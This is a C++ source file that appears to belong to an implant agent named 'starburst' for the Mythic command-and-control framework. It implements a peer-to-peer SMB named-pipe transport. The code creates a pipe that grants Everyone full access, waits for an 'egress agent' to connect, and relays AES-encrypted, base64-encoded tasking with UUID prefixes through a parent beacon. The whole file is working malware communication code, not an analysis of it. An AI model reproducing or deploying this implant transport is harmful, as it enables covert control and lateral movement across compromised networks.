#include <common.h>
#include <transport_smb.h>
#include <base64.h>
#include <crypto.h>
#include <strings.h>

#if defined( SMB_TRANSPORT )

using namespace stardust;
using namespace starburst;

auto declfn smb_pipe_security_init(
    _Inout_ instance& inst,
    _Out_   SECURITY_ATTRIBUTES* sa,
    _Out_   PSECURITY_DESCRIPTOR* psd
) -> bool {
    *psd = static_cast<PSECURITY_DESCRIPTOR>(
        inst.heap_alloc( SECURITY_DESCRIPTOR_MIN_LENGTH )
    );
    if ( !*psd ) return false;

    if ( !inst.advapi32.InitializeSecurityDescriptor(
        *psd, SECURITY_DESCRIPTOR_REVISION ) ) {
        inst.heap_free( *psd );
        return false;
    }

    // DACL that allows everyone full access to the pipe
    SID_IDENTIFIER_AUTHORITY world_auth = SECURITY_WORLD_SID_AUTHORITY;
    PSID everyone_sid = nullptr;

    if ( !inst.advapi32.AllocateAndInitializeSid(
        &world_auth, 1, SECURITY_WORLD_RID,
        0, 0, 0, 0, 0, 0, 0, &everyone_sid ) ) {
        inst.heap_free( *psd );
        return false;
    }

    EXPLICIT_ACCESS_A ea = {};
    ea.grfAccessPermissions = SPECIFIC_RIGHTS_ALL | STANDARD_RIGHTS_ALL;
    ea.grfAccessMode        = SET_ACCESS;
    ea.grfInheritance       = NO_INHERITANCE;
    ea.Trustee.TrusteeForm  = TRUSTEE_IS_SID;
    ea.Trustee.TrusteeType  = TRUSTEE_IS_WELL_KNOWN_GROUP;
    ea.Trustee.ptstrName    = static_cast<LPSTR>( everyone_sid );

    PACL acl = nullptr;
    if ( inst.advapi32.SetEntriesInAclA( 1, &ea, nullptr, &acl ) != ERROR_SUCCESS ) {
        inst.advapi32.FreeSid( everyone_sid );
        inst.heap_free( *psd );
        return false;
    }

    inst.advapi32.SetSecurityDescriptorDacl( *psd, TRUE, acl, FALSE );

    sa->nLength              = sizeof( SECURITY_ATTRIBUTES );
    sa->lpSecurityDescriptor = *psd;
    sa->bInheritHandle       = FALSE;

    return true;
}

auto declfn starburst::smb_pipe_create(
    _Inout_ instance& inst
) -> bool {
    SECURITY_ATTRIBUTES sa = {};
    PSECURITY_DESCRIPTOR psd = nullptr;

    bool has_sec = smb_pipe_security_init( inst, &sa, &psd );

    // build full pipe path: \\.\pipe\<pipename>
    char pipe_path[300] = {};
    str_copy( pipe_path, symbol<char*>( const_cast<char*>( "\\\\.\\pipe\\" ) ) );
    str_concat( pipe_path, inst.transport.pipename );

    inst.h_pipe = inst.kernel32.CreateNamedPipeA(
        pipe_path,
        PIPE_ACCESS_DUPLEX,
        PIPE_TYPE_MESSAGE | PIPE_READMODE_MESSAGE | PIPE_WAIT,
        PIPE_UNLIMITED_INSTANCES,
        PIPE_BUFFER_MAX,
        PIPE_BUFFER_MAX,
        0,
        has_sec ? &sa : nullptr
    );

    if ( psd ) inst.heap_free( psd );

    if ( inst.h_pipe == INVALID_HANDLE_VALUE ) {
        DBG_PRINT( inst, "CreateNamedPipeA failed: %d\n", inst.kernel32.GetLastError() );
        return false;
    }

    DBG_PRINT( inst, "SMB pipe created: %s\n", pipe_path );

    // block until egress agent connects
    if ( !inst.kernel32.ConnectNamedPipe( inst.h_pipe, nullptr ) ) {
        DWORD err = inst.kernel32.GetLastError();
        if ( err != ERROR_PIPE_CONNECTED ) {
            DBG_PRINT( inst, "ConnectNamedPipe failed: %d\n", err );
            inst.kernel32.CloseHandle( inst.h_pipe );
            inst.h_pipe = INVALID_HANDLE_VALUE;
            return false;
        }
    }

    DBG_PRINT( inst, "SMB pipe connected\n" );
    return true;
}

auto declfn starburst::smb_pipe_send(
    _Inout_ instance& inst,
    _In_    HANDLE    pipe,
    _In_    uint8_t*  data,
    _In_    uint32_t  len
) -> bool {
    // wire format: [uint32 size (big-endian)] + [data]
    uint8_t header[4];
    header[0] = (len >> 24) & 0xFF;
    header[1] = (len >> 16) & 0xFF;
    header[2] = (len >> 8)  & 0xFF;
    header[3] = len & 0xFF;

    DWORD written = 0;
    if ( !inst.kernel32.WriteFile( pipe, header, 4, &written, nullptr ) || written != 4 ) {
        return false;
    }

    uint32_t offset = 0;
    while ( offset < len ) {
        uint32_t chunk = len - offset;
        if ( chunk > PIPE_BUFFER_MAX ) chunk = PIPE_BUFFER_MAX;

        written = 0;
        if ( !inst.kernel32.WriteFile( pipe, data + offset, chunk, &written, nullptr ) ) {
            return false;
        }
        offset += written;
    }

    return true;
}

auto declfn starburst::smb_pipe_recv(
    _Inout_ instance& inst,
    _In_    HANDLE    pipe,
    _Out_   uint8_t** data,
    _Out_   uint32_t* len
) -> bool {
    *data = nullptr;
    *len  = 0;

    // check if data available (non-blocking)
    DWORD avail = 0;
    if ( !inst.kernel32.PeekNamedPipe( pipe, nullptr, 0, nullptr, &avail, nullptr ) ) {
        return false;
    }
    if ( avail == 0 ) return false;

    // read size header (4 bytes, big-endian)
    uint8_t header[4] = {};
    DWORD   read_bytes = 0;

    if ( !inst.kernel32.ReadFile( pipe, header, 4, &read_bytes, nullptr ) || read_bytes != 4 ) {
        return false;
    }

    uint32_t msg_size = ((uint32_t)header[0] << 24) |
                        ((uint32_t)header[1] << 16) |
                        ((uint32_t)header[2] << 8)  |
                        ((uint32_t)header[3]);

    if ( msg_size == 0 || msg_size > 0x3C00000 ) return false; // 60MB sanity

    auto buf = static_cast<uint8_t*>( inst.heap_alloc( msg_size ) );
    if ( !buf ) return false;

    uint32_t total_read = 0;
    while ( total_read < msg_size ) {
        uint32_t chunk = msg_size - total_read;
        if ( chunk > PIPE_BUFFER_MAX ) chunk = PIPE_BUFFER_MAX;

        read_bytes = 0;
        BOOL ok = inst.kernel32.ReadFile( pipe, buf + total_read, chunk, &read_bytes, nullptr );
        if ( !ok ) {
            DWORD err = inst.kernel32.GetLastError();
            if ( err == ERROR_MORE_DATA ) {
                total_read += read_bytes;
                continue;
            }
            inst.heap_free( buf );
            return false;
        }
        total_read += read_bytes;
    }

    *data = buf;
    *len  = msg_size;
    return true;
}

auto declfn starburst::smb_init(
    _Inout_ instance& inst
) -> bool {
    inst.h_pipe    = INVALID_HANDLE_VALUE;
    inst.smb_links = nullptr;

    if ( !smb_pipe_create( inst ) ) {
        return false;
    }

    DBG_PRINT( inst, "SMB transport initialized: pipe=%s\n", inst.transport.pipename );
    return true;
}

auto declfn starburst::smb_send(
    _Inout_ instance& inst,
    _In_    uint8_t*  data,
    _In_    uint32_t  len,
    _Out_   uint8_t** response,
    _Out_   uint32_t* resp_len
) -> bool {
    *response = nullptr;
    *resp_len = 0;

    // encrypt
    uint8_t* encrypted = nullptr;
    uint32_t enc_len = 0;
    if ( !crypto_encrypt( inst, inst.agent.aes_key, data, len, &encrypted, &enc_len ) ) {
        return false;
    }

    // prepend UUID + encrypted
    uint32_t uuid_len = str_len( inst.agent.checked_in ? inst.agent.uuid : inst.agent.payload_uuid );
    uint32_t raw_len  = uuid_len + enc_len;
    auto raw = static_cast<uint8_t*>( inst.heap_alloc( raw_len ) );
    if ( !raw ) { inst.heap_free( encrypted ); return false; }

    memory::copy( raw, inst.agent.checked_in ? inst.agent.uuid : inst.agent.payload_uuid, uuid_len );
    memory::copy( raw + uuid_len, encrypted, enc_len );
    inst.heap_free( encrypted );

    // base64 encode
    uint32_t b64_len = 0;
    auto b64_data = base64_encode( inst, raw, raw_len, &b64_len );
    inst.heap_free( raw );
    if ( !b64_data ) return false;

    // send over pipe
    if ( !smb_pipe_send( inst, inst.h_pipe, b64_data, b64_len ) ) {
        inst.heap_free( b64_data );
        // pipe broken - try to recreate
        inst.kernel32.DisconnectNamedPipe( inst.h_pipe );
        inst.kernel32.CloseHandle( inst.h_pipe );
        if ( smb_pipe_create( inst ) ) {
            bool retry = smb_pipe_send( inst, inst.h_pipe, b64_data, b64_len );
            inst.heap_free( b64_data );
            if ( !retry ) return false;
        } else {
            return false;
        }
    } else {
        inst.heap_free( b64_data );
    }

    // wait for response
    // SMB is synchronous within the pipe - egress agent sends response back
    uint8_t* recv_buf = nullptr;
    uint32_t recv_len = 0;

    // poll with timeout - egress needs a full beacon cycle to relay through Mythic
    for ( int attempt = 0; attempt < 3000; attempt++ ) {
        if ( smb_pipe_recv( inst, inst.h_pipe, &recv_buf, &recv_len ) ) break;

        LARGE_INTEGER delay;
        delay.QuadPart = -100000LL; // 10ms - 3000 × 10ms = 30s total
        inst.ntdll.NtDelayExecution( FALSE, &delay );
    }

    if ( !recv_buf || recv_len == 0 ) return false;

    // base64 decode
    uint32_t decoded_len = 0;
    auto decoded = base64_decode( inst, recv_buf, recv_len, &decoded_len );
    inst.heap_free( recv_buf );

    if ( !decoded || decoded_len < 36 ) {
        if ( decoded ) inst.heap_free( decoded );
        return false;
    }

    // skip UUID prefix (36 bytes)
    uint8_t* cipher_data = decoded + 36;
    uint32_t cipher_len  = decoded_len - 36;

    // decrypt
    uint8_t* plain = nullptr;
    uint32_t plain_len = 0;
    if ( !crypto_decrypt( inst, inst.agent.aes_key, cipher_data, cipher_len, &plain, &plain_len ) ) {
        inst.heap_free( decoded );
        return false;
    }

    inst.heap_free( decoded );

    *response = plain;
    *resp_len = plain_len;
    return true;
}

auto declfn starburst::smb_destroy(
    _Inout_ instance& inst
) -> void {
    // close all linked pipes
    auto link = inst.smb_links;
    while ( link ) {
        auto next = link->next;
        if ( link->h_pipe && link->h_pipe != INVALID_HANDLE_VALUE ) {
            inst.kernel32.CloseHandle( link->h_pipe );
        }
        if ( link->agent_id ) inst.heap_free( link->agent_id );
        if ( link->pipe_name ) inst.heap_free( link->pipe_name );
        inst.heap_free( link );
        link = next;
    }
    inst.smb_links = nullptr;

    // close our pipe
    if ( inst.h_pipe && inst.h_pipe != INVALID_HANDLE_VALUE ) {
        inst.kernel32.DisconnectNamedPipe( inst.h_pipe );
        inst.kernel32.CloseHandle( inst.h_pipe );
        inst.h_pipe = INVALID_HANDLE_VALUE;
    }
}

#endif
